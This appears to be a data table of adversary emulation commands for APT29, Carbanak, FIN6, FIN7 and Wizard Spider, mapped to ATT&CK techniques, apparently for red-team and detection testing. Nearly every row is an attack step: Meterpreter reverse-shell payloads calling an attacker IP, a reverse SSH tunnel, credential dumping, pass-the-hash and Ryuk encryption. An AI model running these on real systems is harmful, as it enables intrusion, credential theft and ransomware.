APT;SCENARIO;ID TECHNIQUE;TOOL;DESCRIPTION;COMMAND
APT29;1;T1041;pupy;exfiltration over C2 channel;"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`"
APT29;1;T1105;metasploit;start Metasploit handler;[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`
APT29;1;T1105;pupy;upload [monkey.png] to target;"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`"
APT29;1;T1105;metasploit;upload compromised version of [SysinternalsSuite.zip] to target;"[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`"
APT29;1;T1070.004;metasploit;delete [SysinternalsSuite.zip] file;"[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`"
APT29;1;T1555.003;chrome passwords;execute chrome-password collector;"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`"
APT29;1;T1003.002;metasploit;dump password hashes;[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`
APT29;1;T1569.002;psexec;execute [SeaDuke] remotely via PSEXEC;"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`"
APT29;1;;pupy;generate a Pupy-EC4 callback payload;`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`
APT29;1;;metasploit;generate a PowerShell-formatted Meterpreter payload;`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`
APT29;1;;Invoke PSImage;embed meterpreter.ps1 into a PNG file using Invoke-PSImage;`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`
APT29;1;;metasploit;generate a Meterpreter service-binary (persistence service payload);`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`
APT29;1;;metasploit;generate python-formatted Meterpreter;`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`
CARBANAK;1;;metasploit;start Metasploit;`sudo msfconsole`
CARBANAK;1;;metasploit;set up TCP listener for Meterpreter on TCP port 8080;"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```"
CARBANAK;1;;metasploit;set up HTTP listener for Meterpreter on TCP port 80;" ```
    set payload windows/x64/meterpreter_reverse_https
    set lport 80
    set ExitOnSession False
    exploit -j
```"
CARBANAK;1;;metasploit;load PowerShell into memory;`meterpreter > load powershell`
CARBANAK;1;;metasploit;import [PowerView] into memory;`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`
CARBANAK;1;;metasploit;execute [PowerView's Get-NetComputer] from memory;`meterpreter > powershell_execute Get-NetComputer`
CARBANAK;1;;metasploit;execute [PowerView's Find-LocalAdminAccess] from memory and write its output to a file on disk;"`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`"
CARBANAK;1;T1021.004;plink;Use plink.exe to SSH;`plink.exe <domain_admin>@<bankfileserver_ip>`
CARBANAK;1;;tinymet;Execute TinyMet;`start /b tiny.exe 192.168.0.4 8080`
CARBANAK;1;T1572;plink;Setup reverse SSH tunnel;"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`"
CARBANAK;1;T1113;metasploit;Begin capturing the `CFO`'s screen using Metasploit's `screen_spy` module;"```
    use post/windows/gather/screen_spy
    set COUNT 60
    set DELAY 1
    set VIEW_SCREENSHOTS false
    set SESSION 3
    exploit
```"
CARBANAK;1;T1021.005;metasploit;Make firewall rule to allow TightVNC Server using Metasploit's `run_as` module;"```
    use post/windows/manage/run_as
    set CMD ""netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900""
    set DOMAIN <domain_full>
    set PASSWORD <domain_admin_password>
    set USER <domain_admin>
    set SESSION 3
    exploit
    ```"
CARBANAK;1;T1021.005;metasploit;Disable VNC authentication and prompts using Metasploit's `run_as` module;"    ```
    set CMD ""reg.exe IMPORT C:\Users\Public\vnc-settings.reg""
    exploit
    ```"
CARBANAK;1;T1543.003;metasploit;Delete Registry Persistence using Metasploit's `run_as` module;"    ```
    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
    exploit
    ```"
FIN6;1;T1087.002;adfind;Find all person objects and output the results to a text file.;`adfind.exe -f (objectcategory=person) > ad_users.txt`
FIN6;1;T1018;adfind;Identify all computer objects and output the results to a text file.;`adfind.exe -f (objectcategory=computer) > ad_computers.txt`
FIN6;1;T1482;adfind;Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file.;`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`
FIN6;1;T1482;adfind;Performs a full forest search and dumps trust objects to a text file.;`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`
FIN6;1;T1016;adfind;List subnets and output the results to a text file.;`adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt`
FIN6;1;T1069.002;adfind;List groups and output the results to a text file.;`adfind.exe -f (objectcategory=group) > ad_group.txt`
FIN6;1;T1134;metasploit;Assumes a meterpreter session and specifies the use of technique 1, a named-pipe impersonation.;`meterpreter> getsystem -t 1`
FIN6;1;T1003.001;metasploit;Load Mimikatz into memory and attempt to retrieve wdigest credentials.;"```sh
meterpreter> load kiwi
meterpreter> creds_all
```"
FIN6;1;T1003.003;metasploit;This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the NTDS.dit and SYSTEM hive;"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```"
FIN6;1;T1003.001;Windows Credential Editor;dumps cleartext passwords stored by the digest authentication package.;"```sh
wce.exe -w
```"
FIN6;1;T1567.002;plink;Initiate an interactive SSH session with a remote server.;"```sh
plink -ssh #{user}@#{server}
```"
FIN6;2;T1059.001;metasploit;Runs a PowerShell session on a remote POS host over SMB using PsExec with the supplied domain credentials.;"```
msf> use exploit/windows/smb/psexec
msf exploit(psexec) > set Target PowerShell
msf exploit(psexec) > set RHost #{POS system}
msf exploit(psexec) > set SMBDomain #{Domain}
msf exploit(psexec) > set SMBPass #{Password}
msf exploit(psexec) > set SMBUser #{User}
msf exploit(psexec) > exploit
```"
FIN6;2;T1047;wmic;Executing the [POS implant] using WMIC;"`wmic /node:#{""POS system""} process call create #{""executable""}`"
FIN7;1;;metasploit;Start a Meterpreter handler on port 443;"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lport 443
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```"
FIN7;1;T1055.012;paexec;Use `paexec.exe` to perform pass-the-hash to execute `hollow.exe` on `itadmin`;" `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `"
FIN7;1;;metasploit;Setup a Meterpreter handler on 8080 for the BOOSTWRITE shell;"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```"
FIN7;1;T1113;metasploit;Perform 180 screen captures using Metasploit's `screen_spy` module through the `hollow.exe` Meterpreter session.;"    ```
    use post/windows/gather/screen_spy
    set COUNT 180
    set DELAY 1
    set VIEW_SCREENSHOTS false
    set SESSION 2
    exploit
    ```"
FIN7;1;;metasploit;Wait for the `screen_spy` module to complete, then confirm that the screenshots were recorded.;`msf> loot -t screenspy.screenshot`
FIN7;1;;metasploit;Migrate into `mstsc.exe` (RDP client);`meterpreter > migrate -N mstsc.exe `
FIN7;2;;metasploit;Setup a Meterpreter handler for `hollow.exe`;"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lport 443
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```"
WIZARDSPIDER;1;;rubeus;Through Kerberoasting,  obtains encrypted credentials for the domain admin,;`rubeus.exe kerberoast /domain:oz.local`
WIZARDSPIDER;1;;adfind;used AdFind and nltest/dclist to enumerate domain computers, including the domain controller;"adfind -f ""(objectcategory=group)""`"
WIZARDSPIDER;1;;ryuk;Ryuk Encryption for Impact;`ryuk.exe --encrypt --process-name notepad.exe`
